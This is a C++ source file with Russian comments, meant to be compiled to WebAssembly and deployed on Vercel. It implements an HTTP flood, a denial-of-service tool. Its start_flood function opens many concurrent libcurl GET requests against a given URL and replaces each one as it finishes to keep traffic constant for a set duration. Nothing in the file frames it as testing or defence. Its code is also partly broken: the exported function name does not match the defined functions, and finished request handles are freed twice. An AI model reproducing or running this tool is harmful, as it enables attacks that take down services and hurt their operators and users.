// api/flood.cpp
// Компилировать: emcc flood.cpp -o flood.wasm -s EXPORTED_FUNCTIONS='["_malloc", "_free", "_flood"]' -s ALLOW_MEMORY_GROWTH=1
// Для Vercel этот файл будет обёрнут в Node.js адаптер (см. flood.js)

#ifdef __EMSCRIPTEN__
#include <emscripten.h>
#include <string>
#include <thread>
#include <vector>
#include <curl/curl.h>
#include <chrono>

extern "C" {

// Глобальный флаг для остановки
bool g_running = true;

EMSCRIPTEN_KEEPALIVE
void stop_flood() {
    g_running = false;
}

EMSCRIPTEN_KEEPALIVE
void start_flood(const char* url, int threads, int duration_sec) {
    g_running = true;
    CURLM* multi_handle = curl_multi_init();
    std::vector<CURL*> handles;
    
    // Инициализация libcurl
    curl_global_init(CURL_GLOBAL_ALL);
    
    for(int i = 0; i < threads; i++) {
        CURL* eh = curl_easy_init();
        curl_easy_setopt(eh, CURLOPT_URL, url);
        curl_easy_setopt(eh, CURLOPT_TIMEOUT, 1L);
        curl_easy_setopt(eh, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(eh, CURLOPT_MAXREDIRS, 3L);
        curl_easy_setopt(eh, CURLOPT_USERAGENT, "SWILL-FLOOD-CPP/2016");
        curl_easy_setopt(eh, CURLOPT_NOBODY, 0L); // GET request
        curl_easy_setopt(eh, CURLOPT_VERBOSE, 0L);
        handles.push_back(eh);
        curl_multi_add_handle(multi_handle, eh);
    }
    
    auto start_time = std::chrono::steady_clock::now();
    int still_running = 0;
    
    while(g_running) {
        auto now = std::chrono::steady_clock::now();
        if(duration_sec > 0) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
            if(elapsed >= duration_sec) break;
        }
        
        curl_multi_perform(multi_handle, &still_running);
        
        // Перезапуск завершённых запросов (постоянный поток)
        int msgs_left;
        CURLMsg* msg;
        while((msg = curl_multi_info_read(multi_handle, &msgs_left))) {
            if(msg->msg == CURLMSG_DONE) {
                CURL* eh = msg->easy_handle;
                curl_multi_remove_handle(multi_handle, eh);
                curl_easy_cleanup(eh);
                
                // Создаём новый на замену
                CURL* new_eh = curl_easy_init();
                curl_easy_setopt(new_eh, CURLOPT_URL, url);
                curl_easy_setopt(new_eh, CURLOPT_TIMEOUT, 1L);
                curl_easy_setopt(new_eh, CURLOPT_FOLLOWLOCATION, 1L);
                handles.push_back(new_eh);
                curl_multi_add_handle(multi_handle, new_eh);
            }
        }
    }
    
    // Очистка
    for(CURL* eh : handles) {
        curl_multi_remove_handle(multi_handle, eh);
        curl_easy_cleanup(eh);
    }
    curl_multi_cleanup(multi_handle);
    curl_global_cleanup();
}

} // extern "C"
#endif
